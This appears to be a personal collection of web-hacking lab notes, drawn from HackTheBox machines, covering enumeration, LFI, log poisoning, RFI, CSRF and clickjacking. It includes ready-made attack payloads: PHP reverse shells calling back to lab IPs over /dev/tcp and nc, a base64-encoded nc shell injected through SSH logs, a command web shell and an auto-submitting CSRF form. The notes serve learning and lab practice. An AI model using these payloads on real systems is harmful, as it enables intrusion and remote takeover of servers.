# Web hacking labs

This is a compilation of the web hacking techniques I could recopilate trying separate it in each category or from what hackthebox machine I was able to get it!

Hope you enjoy!


## Enumeration
Before start I recomend download the SecList wordlist in your kali Linux:
```
cd User/share/wordlist
sudo git clone https://github.com/danielmiessler/SecLists
```
#### Brute Force
###### Directories brute-force
```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88 -o gobuster/port80root.txt

feroxbuster -u http://10.10.10.88 -x php -B -n
```
**Hack steps**
1. Make some manual request to discover the most essential
2. Use de site-map generate manually to launch an automate annalysis for the hidden content
3. Try apply several domain name if you discover and extensions (for backups as well)
4. If you discover some new path just repeat recursively

###### Parameters brute-force
**hack steps**
1. Use a common list of debug parameter names (debug, test, hide, source, etc...) and common values (true, yes, 1...), for this we can use "Cluster Bomb" at>
2. Monitor all responses received to identify anomalies
3. Priorize the function where the developers is more probable that they had implemented debug logic (long, search, file upload or download)

A wordlist we can use to search for parameters could be:
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt

```bash
#brute forcing GET parameters name
##example form Timing machine (htb)
wfuzz -u http://$ipv/image.php?FUZZ=/etc/passwd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt --hw 0
wfuzz -z list,a-b-c -z list,1-2-3 http://mysite.com/FUZZ/FUZ2Z
wfuzz -w burp-parameter-names.txt -w tftp.fuzz.txt http://mysite.com/FUZZ/FUZ2Z

#brute forcing POST parameters name
wfuzz -c -w users.txt --hs "Login name" -d "name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in" http://zipper.htb/zabbix/index.php
wfuzz -z list,a-b-c -z list,1-2-3 -d "FUZZ=FUZ2Z&autologin=1&enter=Sign+in" http://mysite.com/index.php
wfuzz -w burp-parameter-names.txt -w tftp.fuzz.txt -d "FUZZ=FUZ2Z&autologin=1&enter=Sign+in" http://mysite.com/index.php
```


#### Spidering
Tools to spidering:
- Burp Suite
- WebScarab
- Zed Attack Proxy (ZAP)
- CAT

Spidering using puppeteer (nodejs) combinated with tor nodes.
https://school.geekwall.in/p/mYqy1FSw
https://www.webscrapingapi.com/web-scraping-with-a-headless-browser-using-puppeteer-and-node-js/


###### User-directed Spidering
A way to spidering manually where an application is recopilling information related to the sites that the users visit.
You can use for this:
- Burp Suite
- Scaraban

**Spidering Hack-steps**
1. Configure your browser to proxy with burp suite (foxy proxy), define in this the scope
2. Visit each url and link you see in the webpage, submit every forms and inputs. Try to browse with and without javascript enabled and same with cookies
3. Review the site map generate by the burp spider and check in case that there were routes that you didn't discover manually check where were founded and visit this places just in case we could find more information
4. Optionally, now with a first glance of automatic and manual spidering, add the manual routes to the spidering and launch the automatic spidering again. Remember to exclude the dangerous path!

###### Discovery Hidden Content
- Debug Information that doesn't have been remove
- Actions or content dedicated to another kind of users
- Backup files
- Logs files

###### Inference form the published content
Name Scheduling -> Observe wich nomenclature follow for some files (NewPage.jsp or About.php), the minus case or capital letters and try to create a dictionary related with this

**Hack steps**
1. Check any client-side code (javascript and html) to see if fitlers some sensitive information related to hidden files:
	- Comments
	- Forms without submit
	- If you file AddDocumento.jsp and DeleteDocumento.jsp you should create a custom wordlist for keep searching other actions as edit, move...
2. Try to discover wich extensions use the server and serach using some standard as  txt, bak, src, inc, and old
3. Search for temporary files created by developer tools and may have sensitive information.  Examples include the .DS_Store file, which contains a directory index under OS X, file.php~1, which is a temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools.
4. For each new element discover retry the steps here

###### Use of public information
- SearchEngine (Google, yahoo, bin...)
- Web archives as WayBack machine
```text
site:www.wah-target.com
site:www.wahh-target.com login
link:www.wahh-target.com # Include the website and application in the link. This may include links to old content, fucntionalities etc..
related:www.wahh-target.com #Páginas "similares al la web
```
1. Try to search not just in Google web section but in the Groups and News
2. Browser to the last page of search
3. Try cached version
4. Use other domains not just google!

###### Levering the Web Server
Nikto and Wikto are automatic tools to identifies well-known vulnerabilities.

###### Application pages Vs. Functional Path
Is important create a map-site of path/functionalities for the website. For that we recolect:
- Pages that allows action over them
- Type of request used

and with that on mind just:
1. Identify instances where you access to functionalities using the name of a function as a parameter (`/admin.jsp?action?editUser`)
2. Brute force the parameter to try discover other functions accesible but theoretically not accesible
3. Compile a map of application content based on functional paths enumerating all the enumerated functions and the logical paths and dependencies between them


#### Identify Entry Points for User Input
The key locations to pay attention to:
- Every URL string up to the query string market
- Every parameter submitted within the URL query string
- Every parameter submitted with POST
- Every cookie
- Every other HTTP header (*User-Agent, Referer, Accept, Accept-Language and Host*)

###### URL File Paths
For REST-style URL
`http://eis/shop/browse/electronics/iPhone3G/`
We can consider this kind of URL's as entry points to the user due to that the path use the real name of the folders and files.

###### Request Parameters
Parameters submitted within the URL query string (GET), the message body (POST) and HTTP cookies are the most obvious entry points for user input but is possible find some custom XLM withing parameter data.

If you dissect the format and place with your own payload you may find SQLI or path traversal!

###### HTTP Headers
Applications logs some content of HTTP header such as _Referer and _User-Agent_. This headers should be consider as entry points.

- _Referer_: Sometime modifying this we can get that the page apply different behaviours and add HTML in respomnse. This could be useful to discover some vulenrabilities.
- _User-Agent_: Sometimes a same web return different versions depending of the User-Agent received. This can imply differents web vulnerabilities. We should spoof some User-Agent to see the different and even study each one as a different webapp.

For more about the _User-Agent_ as an entry point:
https://miloserdov.org/?p=5346
```
[PENDIENTE DE DESARROLLAR]
[spoof several User-agents and get if some answer is different!]
```
Burp Intruder containe a built-in payload list containing a large number of user agents with which you can check the different responses with the different possibilities.

- IP-Address: In addition sometimes the IP Address is used to allow the session for users, geolocation etc... When the server is at back of a load balancer or proxy the IP address is specified in the _X-Forwarded-For_. By adding a suitably crafted _X-Forwarded-For_ you may be able to deliver SQLi or even persistent XSS

#### Identify Server-side technology
###### Banner Grabbing
- Templates HTML
- Custom HTTP Headers
- URL query string parameter

###### HTTP Fingerprinting
Install httprint  if you don't have it:
```
#This tools was not too much useful.
sudo apt install httprint
```

https://net-square.com/httprint_paper.html

###### File Extensions
- asp -> MicroWebSphere
- pl -> Perl
- py -> python
- dll -> Compiled native code (C or C++)
- nsf or ntf -> Louts Domino

If the extensions are hidden for the url we may find different error when we add the correct extension (custom template) and when we try with a different extension (standar error)

###### Directory names
We can guess the technology based in some directories we found.
- servlet -> Java servlets
- pls -> Oracle Application Server PL/SQL Gateway
- cfdocs or cfide -> Cold Fusion
- SilverStream -> SilverStream web server
- WebObjects or {function}.woa -> Apple WebObjects
- rails -> Ruby on Rails

###### Session Tokens
- JSESSIONID -> Java Platform
- ASPSESSIONID -> Microsoft IIS server
- ASP.NET_SessionId -> Microsoft ASP.NET
- CFID/CFTOKEN -> Cold Fusion
- PHPSESSID -> PHP

## Attack vectors
The different attacks we're going to deploy here and define a methodology are:
- Local File Inclusion
- Wrappers
- Log Poisoning
- Remote File Inclusion
- HTML Injection
- Cross-Site Scripting (XSS)
- Blind Cross-Site Scripting (XSS Blind)?
- Cross-Site Request Forgery (CSRF)
- Server-Side Request Forgery (SSRF)
- SQLi - Error based
- SQLi - Time based
- Padding Oracle Attack (Padbuster)
- Padding Oracle Attack (Bit Flipper Attack with Burpsuite)
- ShellShock
- XML External Entity Injection (XXE)
- Blind XXE
- Domain Zone Transfer
- Insecure Deserialization
- Type Juggling


-----------------------

Other I plan to add:
- IDOR
- Magic Numbers
- IDN homographic attack


#### Local File Inclusion
**PoC**
```bash
#run apache service
sudo service apache2 start
#check the port 80 busy
lsof -i:80

#Create a php app
cd /var/www/html
nano example.php
```
```text
<?php
	$filename = $_GET['file']; # ?file=example.php
	include($filename);# to include a particular path include("/var/www/html/" . $filename), but you can bypass with ../../../.....
?>
```


Right now you can exploit the LFI in your local machine with: `localhost/example.php?file=/etc/passwd`

What can we do exploit with this?:
- Enum users (/etc/passwd)
- Extract ssh keys (~/.ssh/id_rsa)
- Log Poisoning
- Enumerate /proc/ information
	- Enumerate process and IP interfaces (/proc/sched_debug)
	- Enumerate IP interfaces (/proc/net/fib_trie)
	- Enumerate open ports (/proc/net/tcp)
	```
	for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
	```
	And if you can't use bc other way to conver hexadecimal to decimal in bash is:
	```
	for port in $(cat /proc/net/tcp | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(printf $port=%d\n)" $((16#$port)); done
	```
###### Bypassing restriction for LFI
[Still not developed]
**Null Byte injection**
Code example:
```php
<?php
	$filename = $_GET['file'];
	include("/var/www/html" . $filename ".randomextension");
?>
```
You could avoid the extension reading adding a null byte injectio
../../../../etc/passwd%00

**PHP Wrappers**
You can try bypass some LFI restirctions using the Wrappers:&
- `http://localhost/example.php?file=file://../../../../etc/passwd`
- `http://localhost/example.php?file=php://filter/convert.base64-encode/resource=/../../../../etc/passwd`
- 


#### Log Poisoning
To convert a LFI in RCE we can use the logs files:
```
#check the apache logs
http://localhost/example.php?file=/var/log/apache2/access.log
#ssh login tries
http://localhost/example.php?file=/var/log/auth.log
##to exploit this you can try to use a reverse shell command as a user but code it in base64
echo "nc -e /bin/bash ip_kali 443" | base64
>bmMgLWUgL2Jpbi9iYXNoIGlwX2thbGkgNDQzCg==
###login in the ssh service
ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIGlwX2thbGkgNDQzCg== | base64 -d | bash"); ?>'
```
We can modify the user-agent to execute php code when we access it using the LFI vulenrability
```
curl -s -H "User-Agent: <?php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
```

#### Remote File Inclusion - RFI
You can create a malicious php in your local machine and make the remote server download and execute this file.
To exploit this and get a reverse shell you need three tabs opened and execute in the next order:
```
curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://$malicious_IP/maliciousfile.php
```

#### CSRF
Where is the risk for this?

The risk can be come from two different vectors:
1. Use a GET request to make a user autheticate in a particular site do some unconcious action without his concern. For example change a password:
```
http://10.10.10.97/change_pass.php?password=hola123&confirm_pass=hola123&submit=submit
```
We could this way force change the user password.

So if we found some critical POST request we should try use a GET to exploit this!

We could use shorturl.at to disguise the suspitions in this case.

2. To exploit a POST request the idea is server a web application that automatically send a POST request to apply the action:
```html
<form method="POST" action="https://ac7f1fed1e92653dc0e3b231003200d4.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="prueba&#64;mail&#46;com">
</form>
<script>
      document.forms[0].submit();
</script> 
```
This way if we make the user go in we will force him to send the POST request with the information we want.

Is common exploit this using an img tag (or in a malicious web or directly injected with HTML injection!
```
<img src="http://www.sitio001.com/comprar.asp?idObjeto=31173
&confirm=yes" onerror="this.src="logo.jpg";this.onerror=null;"/>
```
You could use CSS to avoid see the not found image to be more professional.

The only way to protect from CSRF is define some numeric value unique for each request in a catpcha way for example, that the user have to put it to do critical actions.

Some good practices we should do are:
- Close session of a web after finish our activity on it
- Not remember credentials in the browser
- Use different browser for fun and for bussiness

--------------------------------------
#### CMR
###### Wordpress
If you detect and wordpress site first thing you should do is locate plugins in that:
```
wpscan -u http://10.10.10.88/webservice/wp/ --enumerate p,t,u | tee wpscan.log

##with wfuzz
###locate *plugin* -> /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
wfuzz -c -hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```

**Wordpress Database Structure
https://blogvault.net/wordpress-database-schema/


#### Clickjacking
Consist in use iframes object to superpose the content of 3rd that the user to made him click in a place.

https://github.com/clarkio/clickjacking

For example when you click a player buttom and you are doing a like to a some facebook publication without your concern. For that you should put the iframe in the front and made it invisible (transparent) using CSS.

Another variation is duplicate your mouse cursor and fix a distance from the original and then hide the originl one, then we could made him click in unsafe elements without his concern.


To mitigate this use:
- Framekiller JS to prevent that a web were displayed in a frame object.
```
#implementation
<style>html{display:none;}</style>
<script>
   if (self == top) {
       document.documentElement.style.display = 'block'; 
   } else {
       top.location = self.location; 
   }
</script>
```
- Content Policy headers could be useful How? Investigate...
- X-Frame-Options header can restrict which origin can embed a specific page. This is the most recommended way. Just setting as Deny or SAMEORIGIN will prevent that your webpage were embed in another using a frame object.

--------------------------------------
## Anex A
PHP functions to execute with php:
- system
- exec
- passthru
- shell_exec


https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/

## basic php reverse shells
```
<?php
        exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4321 0>&1'");
?>

<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'");
?>

<?php
        system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4321 >/tmp/f');
?> 

<?php
    echo "<pre>" . shell.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4321 >/tmp/f') . "</pre>";
?>
```

## Basic php web-shell
```
<?php
	system($_REQUEST['cmd']);
?>


```



# Anexo A
## Encoding Schemes
- URL Encoding
```
%3d -> =
%25 -> %
%20 -> Space
%0a -> New line
%00 -> Null byte [ussually works to bypass the WAFs due to that the WAFs commonly have been programmed in native code. The null byte finish the string where this is found]

#Characters we should encode in a malicious http request
space % ? & = ; + #
```
To URL encode we have in Kali linux the `urlencode` command.

- Unicode Encoding
Main interest to bypass input filters, for example some malicious inputs
UTF-8 is variable-lenght and can use one or more bytes to define a character
```
%u2215 -> /
%u00e9 -> é

%c2%a9 ->  ©
%e2%89%a0 -> !=
```
Example?

- HTML encode
You should have this on mind to test xxs

```
&quot; — "
&apos; — '
&amp; — &
&lt; — <
&gt; — >

#In addition, any character can be HTML-encoded using its ASCII code in decimal form:
&#34; — "
&#39; — '

#or by using its ASCII code in hexadecimal form (prefixed by an x ):
&#x22; — "
&#x27; — '
```
- Base64 Encoding
With Base64 you can encode any binary data and represent with ASCII printable characters. We have to recognize any base64 string to decode and check if tthere is some sensitive information
```
echo " text" | base64
echo "dGV4dAo=" | base64 -d
```
- Hex Encoding
```
#encode
echo -n "daf" | od -A n -t x1

#decode
TESTDATA=$(echo '0x64 0x61 0x66')
for c in $TESTDATA; do
    echo $c | xxd -r
done
```
You just should try decode every suspicious information that could be interesting!

- Remoting and serialization Framework
	We'll speak later about this but the main frameworks are:
	- Flex and AMF
	- Silverlight and WCF
	- Java serialized Object



# References
[^1] How to use User Agent to attack websites: https://miloserdov.org/?p=5346 
